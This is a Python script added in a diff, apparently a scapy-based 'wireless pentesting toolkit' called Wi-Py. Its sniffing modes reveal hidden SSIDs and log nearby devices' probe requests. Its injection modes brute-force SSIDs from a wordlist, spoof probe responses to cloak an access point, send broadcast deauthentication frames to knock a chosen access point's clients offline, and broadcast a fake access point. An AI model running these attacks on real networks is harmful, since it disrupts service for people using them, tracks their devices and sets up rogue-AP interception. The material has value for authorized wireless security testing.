@@ -1,0 +1,358 @@
+#!/usr/bin/python3
+
+import sys
+from scapy.all import *
+import argparse
+import textwrap
+import os
+import threading
+import time
+import pandas
+from tabulate import tabulate
+from banner import banner
+import random
+
+
+try:
+    #declaring/defining variables
+    ssids = set()
+    devices = set()
+    pro_Fetch = set()
+    clientsprobes = set()
+    wc = 6
+    hidden_ssids = set()
+    mymac = 'aa:aa:aa:aa:aa:aa'
+    brdmac = 'ff:ff:ff:ff:ff:ff'
+    parser = argparse.ArgumentParser(
+            prog = 'Wi-Py',
+            formatter_class = argparse.RawTextHelpFormatter,
+            description = '\033[38;5;214mWIRELESS PENTESTING TOOLKIT\033[m by \033[38;5;43mHammeR\033[m',
+            usage = 'Use "python3 %(prog)s --help" for more information')
+    data = dict()
+    new_data = dict()
+    networks = pandas.DataFrame.from_dict(data, orient = 'index')
+    f1 = f2 = f3 = f4 = ''
+    onemodedict=dict()
+    onemodetable=pandas.DataFrame.from_dict(onemodedict, orient='index')
+    
+
+    #configuring parser
+
+    #-ifn INTERFACE -c COUNT -m MODE
+    parser.add_argument("-ifn", "--interfacename", dest = "interfacename", default = "wlan0", help = "Interface Name")
+    parser.add_argument("-c", "--count", dest = "count", type = int, default = 100, help = "Count")
+    parser.add_argument("-q", "--quiet", dest = "quiet", action = 'store_true', help = "Quiet")
+    parser.add_argument("-m", "--mode", dest = "mode", type = int, default = 2, help = textwrap.dedent('''\
+            Mode 1 for Simple scanning
+            Mode 2 for Advanced scanning (uncovers Hidden SSIDs)
+            Mode 3 for pRAWfessional scanning
+            Mode 4 for scanning Client Probes
+            Mode 5 for Dictionary Attack
+            Mode 6 for Cloaker
+            Mode 7 for DoS Attack
+            Mode 8 for creating Fake AP
+            '''))
+    args=parser.parse_args()
+
+    if not args.quiet:
+        banner()
+
+    print("Interface Name {} Count {} Mode {} Quite {}\n".format(
+        args.interfacename,
+        args.count,
+        args.mode,
+        args.quiet
+        ))
+
+    
+    #for enabling text style to italics
+    print('\033[?25l', end = "") 
+    
+    
+    #for hiding cursor
+    print('\033[1;3m', end = "")
+    
+    
+    #channel changer function declaration
+    def change_channel():
+        ch = 1
+        while True:
+            os.system("iwconfig {f1} channel {f2}".format(f1 = args.interfacename, f2 = ch))
+            ch = ch%14+1
+            time.sleep(0.5)
+
+
+    #changing channel on a different thread
+    chch = Thread(target = change_channel)
+    chch.daemon = True
+    chch.start()
+
+
+    #printing mode 2 DataFrame
+    def print_all():
+        while True:
+            bad_clrs = ['16', '17', '18', '19']
+            for r in range(0, 16):
+                for g in range(0, 16):
+                    code = str(r*16+g)
+                    os.system("clear")
+                    if code not in bad_clrs:
+                        print(u"\u001b[38;5;" + code + "m")
+                        networks.columns.name = 'BSSID'
+                        try:
+                            print(tabulate(networks, headers = 'keys', tablefmt = 'pretty', showindex = False))
+                        except:
+                            print(networks)
+                        print(u"\u001b[0m")
+                        time.sleep(0.5)
+
+
+    #formatting the output for mode 4
+    def clear_output(wc):
+        lnUp = '\033[1A'
+        lnCls = '\x1b[2K'
+        for i in range(wc):
+            print(lnUp, end = lnCls)
+
+    
+    #for setting up custom source mac address
+    def default_src_mac(ques):
+        options = {"yes": True, "y": True, "ye": True, "": True, "no": False, "n": False}
+        sys.stdout.write('%s [Y/n]  ' % ques)
+        global mymac
+        while True:
+            choice = input().lower()
+            if choice not in options:
+                sys.stdout.write("\nPlease respond with 'yes' or 'no' " "(or 'y' or 'n')  ")
+            elif options[choice]:
+                mymac = input("\nPlease enter your source mac to be set => ")
+                return None
+            elif not options[choice]:
+                return None
+    
+
+    #for first mode; packet with Beacon layer
+    def beacon(pkt):
+        global f1, f2
+        if pkt.haslayer(Dot11Beacon):
+            global ssids
+            temp = pkt
+            while temp:
+                temp = temp.getlayer(Dot11Elt)
+                if temp and temp.ID == 0 and (temp.info not in ssids):
+                    ssids.add(temp.info)
+                    f1 = pkt.addr3
+                    f2 = temp.info.decode()
+                    break
+                temp = temp.payload
+
+
+    #for first mode; packet with FCS layer
+    def fcs(pkt):
+        global f3, f4, devices
+        if pkt.haslayer(Dot11FCS):
+            dot11_layer = pkt.getlayer(Dot11FCS)
+            if dot11_layer.addr2 and (dot11_layer.addr2 not in devices):
+                devices.add(dot11_layer.addr2)
+                f3 = dot11_layer.addr2
+                f4 = dot11_layer.payload.name
+
+
+    #for printing and formatting mode 2 DataFrame
+    if (args.mode == 2):
+        printer = Thread(target = print_all)
+        printer.daemon = True
+        printer.start()
+
+
+    #defining all modes
+
+    #for sniffing modes
+    if (args.mode <= 4):
+
+        #PacketHandler function definition
+        def PacketHandler(pkt):
+
+            #for mode 1
+            if (args.mode == 1):
+                global f1, f2, f3, f4, onemodetable, onemodedict
+                f1 = f2 = f3 = f4 = ''
+                beacon(pkt)
+                fcs(pkt)
+                if (f1 == f3) and not f1 == '' and not f3 == '':
+                    onemodedict[f1] = [f2, f4]
+                else:
+                    if not f3 == '':
+                        onemodedict[f3] = [f1, f4]
+                onemodetable = pandas.DataFrame.from_dict(onemodedict, orient = 'index', columns = ['SSID', 'LAYER'])
+                onemodetable.insert(0, 'BSSID', onemodetable.index)
+                os.system('clear')
+                onemodetable.columns.name = 'BSSID'
+                print(tabulate(onemodetable, headers = 'keys', tablefmt = 'simple', showindex = False))
+                time.sleep(0.010)
+
+            #for mode 2
+            elif (args.mode == 2):
+                if (pkt.haslayer(Dot11Beacon)) or (pkt.haslayer(Dot11ProbeResp)):
+                    bssid = pkt[Dot11].addr3
+                    try:
+                        dbm_signal = pkt[RadioTap].dBm_AntSignal
+                    except:
+                        dbm_signal = "N/A"
+                    ssid, channel, rate = None, None, None
+                    summary = {}
+                    crypto = set()
+                    p = pkt[Dot11Elt]
+                    while isinstance(p, Dot11Elt):
+                        if p.ID == 0 and "ssid" not in summary:
+                            summary["ssid"] = plain_str(p.info)
+                            ssid = summary["ssid"]
+                            if ssid.startswith('\x00'):
+                                summary["ssid"] = '| HIDDEN SSID |'
+                            elif ssid == '':
+                                summary["ssid"] = '| WILDCARD SSID |'
+                        elif p.ID == 3:
+                            summary["channel"] = ord(p.info)
+                        elif isinstance(p, Dot11EltCountry):
+                            summary["country"] = plain_str(p.country_string[:2])
+                            country_descriptor_types = {
+                                b"I": "Indoor",
+                                b"O": "Outdoor",
+                                b"X": "Non-country",
+                                b"\xff": "Ignored"
+                            }
+                            summary["country_desc_type"] = country_descriptor_types.get(
+                                p.country_string[-1:]
+                            )
+                        elif isinstance(p, Dot11EltRates):
+                            rates = [(x & 0x7f) / 2. for x in p.rates]
+                            if "rates" in summary:
+                                summary["rates"].extend(rates)
+                            else:
+                                summary["rates"] = rates
+                        elif isinstance(p, Dot11EltRSN):
+                            wpa_version = "WPA2"
+                            if any(x.suite == 8 for x in p.akm_suites) and \
+                                    all(x.suite not in [2, 6] for x in p.akm_suites) and \
+                                    p.mfp_capable and p.mfp_required and \
+                                    all(x.cipher not in [1, 2, 5]
+                                        for x in p.pairwise_cipher_suites):
+                                wpa_version = "WPA3"
+                            elif any(x.suite == 8 for x in p.akm_suites) and \
+                                    any(x.suite == 2 for x in p.akm_suites) and \
+                                    p.mfp_capable and not p.mfp_required:
+                                wpa_version = "WPA3-transition"
+                            if p.akm_suites:
+                                auth = p.akm_suites[0].sprintf("%suite%")
+                                crypto.add(wpa_version + "/%s" % auth)
+                            else:
+                                crypto.add(wpa_version)
+                        elif p.ID == 221:
+                            if isinstance(p, Dot11EltMicrosoftWPA):
+                                if p.akm_suites:
+                                    auth = p.akm_suites[0].sprintf("%suite%")
+                                    crypto.add("WPA/%s" % auth)
+                                else:
+                                    crypto.add("WPA")
+                        p = p.payload
+                    if not crypto and hasattr(pkt, "cap"):
+                        if pkt.cap.privacy:
+                            crypto.add("WEP")
+                        else:
+                            crypto.add("OPN")
+                    if crypto:
+                        summary["crypto"] = crypto
+                    ssid = summary["ssid"]
+                    channel = summary["channel"]
+                    crypto = summary["crypto"]
+                    crypto = str(crypto).strip('{}').replace("'", "")
+                    global new_data
+                    if (pkt.haslayer(Dot11ProbeResp)):
+                        new_data[bssid] = [ssid, channel, dbm_signal, crypto]
+                    global data
+                    data[bssid] = [ssid, channel, dbm_signal, crypto]
+                    for i in new_data:
+                        data[i] = new_data[i]
+                    global networks
+                    networks = pandas.DataFrame.from_dict(data, orient = 'index', columns = ['SSID', 'CHANNEL', 'RSSI', 'CRYPTO'])
+                    networks.insert(0, 'BSSID', networks.index)
+
+            #for mode 3
+            elif (args.mode == 3):
+                if pkt.haslayer(Dot11Beacon) and (pkt.summary() not in pro_Fetch):
+                    pro_Fetch.add(pkt.summary())
+                    print('{f1} {f2} \n'.format(f1 = len(pro_Fetch), f2 = pkt.summary()))
+
+            #for mode 4
+            elif (args.mode == 4):
+                if pkt.haslayer(Dot11ProbeReq):
+                    if len(pkt.info) > 0:
+                        test = pkt.addr2 + '**' + pkt.info.decode()
+                        if test not in clientsprobes:
+                            global wc
+                            if (wc >= 7):
+                                clientsprobes.add(test)
+                                clear_output(wc)
+                                print("New Probe Found: " + pkt.addr2 + ' ' + pkt.info.decode())
+                                print("\n---------- Client Probes ----------\n")
+                                counter = 1
+                                for probe in clientsprobes:
+                                    [client, ssid] = probe.split('**')
+                                    print('{f1} {f2} {f3}'.format(f1 = counter, f2 = client, f3 = ssid))
+                                    counter = counter+1
+                                print("\n-----------------------------------\n")
+                                wc = wc+1
+                            else:
+                                print("\n"*8)
+                                wc = wc+1
+
+        sniff(iface = args.interfacename, count = args.count, prn = PacketHandler)
+        os._exit()
+
+
+    #for injecting modes
+    elif (args.mode > 4):
+
+        #for mode 5
+        if (args.mode == 5):
+            default_src_mac("Do you want to change the default source mac? (aa:aa:aa:aa:aa:aa)")
+            inp = str(input('\nPlease mention the wordlist name (must be in the same directory) =>  '))
+            print("\n\033[1;34mAnalyse further with Wireshark [Hint: use filter like 'wlan.addr == aa:aa:aa:aa:aa:aa' and look for Probe Response]") 
+            print("You can hit Ctrl+C to skip for particular SSID\033[1;39m") 
+            for ssid in open(inp, 'r').readlines():
+                pkt = RadioTap() / Dot11(type = 0, subtype = 4, addr1 = brdmac, addr2 = mymac, addr3 = brdmac) / Dot11ProbeReq() / Dot11Elt(ID = 0, info = ssid.strip()) / Dot11Elt(ID = 1, info = "\x02\x04\x0b\x16") / Dot11Elt(ID = 3, info = "\x08")
+                print("\nTrying SSID: {}".format(ssid))
+                sendp(pkt, iface = args.interfacename, count = args.count, inter = .2)
+            exit()
+
+        #for mode 6
+        elif (args.mode == 6):
+            spoofmac = input("Please enter any spoofed BSSID to be used => ")
+            spoofnm = input("\nPlease enter any spoofed name to be used => ")
+            cloakmac = input("\nPlease enter the BSSID to be cloaked => ")
+            pkt = RadioTap() / Dot11(type = 0, subtype = 5, addr1 = spoofmac, addr2 = cloakmac, addr3 = cloakmac) / Dot11ProbeResp() / Dot11Elt(ID = 0, info = spoofnm) / Dot11Elt(ID = 1, info = "\x02\x04\x0b\x16") / Dot11Elt(ID = 3, info = "\x08")
+
+        #for mode 7
+        elif (args.mode == 7):
+            apmac = input("Please enter the BSSID to DoS an AP => ")
+            pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = apmac, addr3 = apmac) / Dot11Deauth()
+
+        #for mode 8
+        elif (args.mode == 8):
+            default_src_mac("Do you want to change the default source mac? (aa:aa:aa:aa:aa:aa)")
+            apnm = input("\nPlease enter the AP name to spoof => ")
+            pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = mymac, addr3 = mymac) / Dot11Beacon(cap = 0x1104) / Dot11Elt(ID = 0, info = apnm) / Dot11Elt(ID = 1, info = "\x82\x84\x8b\x96\x24\x30\x48\x6c") / Dot11Elt(ID = 3, info = "\x0b") / Dot11Elt(ID = 5, info = "\x00\x01\x00\x00")
+
+    sendp(pkt, iface = args.interfacename, count = args.count, inter = .2)
+
+
+except:
+    byetexts = ["Is that all?", "Exiting...", "Sweet goodbye!", "See ya soon ;)", "Did you took the red pill?", "*SNIFF* Yep, thats some heavy packets", "Sniff Like a Shark!", "Is it injected yet?", "sudo shutit", "[TIP: Don't use vim. You can never exit VIMicious circle easily.]"]
+    rand = random.choice(byetexts)
+    print("\033[m\n\n" + u"\u001b[41m" + rand + "\033[m")
+
+
+finally:
+    print("\033[1;5m\033[1;3m\n\n\nWAITING FOR YOUR NEXT HEROIC MOVE! " + u'\u23f3' + '\033[m')
+    print('\033[1;23m', end = "")
+    print('\033[?25h', end = "")
